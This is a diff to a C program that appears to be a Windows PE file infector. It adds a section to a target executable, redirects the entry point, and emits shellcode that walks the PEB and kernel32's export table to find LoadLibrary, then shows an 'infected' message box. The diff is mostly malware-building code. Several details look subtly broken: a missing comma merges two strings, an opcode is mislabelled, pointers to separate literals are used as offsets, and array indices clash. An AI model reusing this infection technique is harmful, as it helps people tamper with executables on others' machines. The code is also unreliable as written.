@@ -16,6 +16,15 @@ int main(int argc, char *argv[]) {
 		exit(1);
 	}
 
+	const char *data[] = {
+		"Notice",
+		"You have been infected!",
+		"LoadLibrary",
+		"GetProcAddress"
+		"user32.dll",
+		"MessageBoxA",
+	};
+
 	IMAGE_DOS_HEADER imageDosHeader;
 	IMAGE_FILE_HEADER imageFileHeader;
 	IMAGE_OPTIONAL_HEADER imageOptionalHeader;
@@ -133,7 +142,7 @@ int main(int argc, char *argv[]) {
 		}
 
 		// Found. Search for MessageBoxA
-		if (strcasecmp(name,"user32.dll")==0) {
+		if (strcasecmp(name,data[4])==0) {
 			user32dll_iid.OriginalFirstThunk = getval(fr, dd, SEEK_SET, import_offset + 20 * i);
 			user32dll_iid.TimeDateStamp = getval(fr, dd, SEEK_CUR, 0);
 			user32dll_iid.ForwarderChain = getval(fr, dd, SEEK_CUR, 0);
@@ -162,7 +171,9 @@ int main(int argc, char *argv[]) {
 					fread(function+k, 1, 1, fr);
 					if (function[k] == 0) break;
 				}
-				if (strcasecmp(function,"MessageBoxA")==0) break;
+
+				// Found MessageBoxA
+				if (strcasecmp(function,data[5])==0) break;
 			}
 			break;
 		}
@@ -202,17 +213,11 @@ int main(int argc, char *argv[]) {
 	fseek(fr, 0, SEEK_END);
 	const DWORD old_end = ftell(fr);
 	newish.PointerToRawData = closest(old_end+1,imageOptionalHeader.SectionAlignment);
-	const char *msgCaption = "Notice";
-	const char *msgText = "You have been infected!";
-	const char *function[] = {"MessageBoxA","user32.dll","LoadLibrary", "GetProcAddress"};
 
 	pad(fa, newish.PointerToRawData - old_end);
-	// Written at newish.PointerToRawData
-	fwrite(msgCaption, strlen(msgCaption)+1, 1, fa);
-	// Written at newish.PointerToRawData + strlen(msgCaption) + 1
-	fwrite(msgText, strlen(msgText)+1, 1, fa);
-	for (int i = 0; i < sizeof(function)/sizeof(function[0]); ++i)
-		fwrite(function[i], strlen(function[i]), 1, fa);
+	for (int i = 0; i < sizeof(data)/sizeof(data[0]); ++i)
+		// Each entry is written at newish.PointerToRawData + data[i] - data[0]
+		fwrite(data[i], strlen(data[i])+1, 1, fa);
 
 	// Insert new address of entry point
 	imageOptionalHeader.AddressOfEntryPoint = ftell(fa) - newish.PointerToRawData + newish.VirtualAddress;
@@ -231,6 +236,7 @@ int main(int argc, char *argv[]) {
 	// Find kernel32.dll
 	// mov ebx, fs:0x30
 	instruct(fa, 0x648B1D, 0x30); // 0x64 is a FS segment override prefix, not actually an instruction
+	pad(fa, 3); // 0x30 needs to be a DWORD
 	// mov ebx, [ebx + 0x0C]
 	instruct(fa, 0x8b5b, 0xc);
 	// mov ebx, [ebx + 0x14]
@@ -241,16 +247,66 @@ int main(int argc, char *argv[]) {
 	write_instruction(fa, 0x8b1b);
 	// mov ebx, [ebx + 0x10]
 	instruct(fa, 0x8b5b, 0x10);
-	// mov [ebp-8], ebx
+	// mov [ebp-4], ebx
 	instruct(fa, 0x895d, -4);
+
+	// mov eax, [ebx + 3Ch]
+	instruct(fa, 0x8b43, 0x3c);		// RVA of PE signature
+	// add eax, ebx
+	write_instruction(fa, 0x01d8);
+	// mov eax, [eax + 78h]
+	instruct(fa, 0x8b40, 0x78);		// RVA of Export Table
+	// add eax, ebx
+	write_instruction(fa, 0x01d8);
+	// mov ecx, [eax + 24h]
+	instruct(fa, 0x8b48, 0x24);		// RVA of Ordinal Table
+	// add ecx, ebx
+	write_instruction(fa, 0x01d9);
+	// mov [ebp-08h], ecx
+	instruct(fa, 0x894d, -8);
+	// mov edi, [eax + 20h]
+	instruct(fa, 0x8b78, 0x20);		// RVA of Name Pointer Table
+	// add edi, ebx
+	write_instruction(fa, 0x01df);
+	// mov [ebp-0Ch], edi
+	instruct(fa, 0x897d, -12);
+	// mov edx, [eax + 1Ch] 						// RVA of Address Table
+	instruct(fa, 0x8b50, 0x1c);
+	// add edx, ebx
+	write_instruction(fa, 0x01da);
+	// mov [ebp-10h], edx
+	instruct(fa, 0x8955, -16);
+	// mov edx, [eax + 14h] 						// Number of exported functions
+	instruct(fa, 0x8b50, 0x14);
+
+	// Find LoadLibrary
+	// xor eax, eax
+	write_instruction(fa, 0x31c0);
+	// mov edi, [ebp-0xC]
+	instruct(fa, 0x8b7d,-12);
+	// mov esi, data[4]
+	instruct(fa, 0xbf, imageOptionalHeader.ImageBase + newish.VirtualAddress + data[4] - data[0]);
+	// xor ecx, ecx
+	write_instruction(fa, 0x31c9);
+	// cld
+	write_instruction(fa, 0xfc);
+	// mov edi, [edi + eax*4]
+	write_instruction(fa, 0x8b3c87);
+	// add edi, ebx
+	write_instruction(fa, 0x01df);
+	// add cx, strlen(data[2])
+	instruct(fa, 0x6683c1,data[2] - data[2-1]);
+	// repe cmpsb
+	write_instruction(fa, 0xf3a6);
 
 	// Call MessageBoxA
 	// push 1030h (Type)
 	instruct(fa, 0x68, 0x1030);
-	// push msgCaption
+	// push data[0]
 	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newish.VirtualAddress);
-	// push msgText
-	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newish.VirtualAddress + strlen(msgCaption) + 1);
+	// push data[1]
+	instruct(fa, 0x68,
+		imageOptionalHeader.ImageBase + newish.VirtualAddress + data[1] - data[0]);
 	// push 0 (hWnd)
 	instruct(fa, 0x6a, 0);
 	// call MessageBoxA
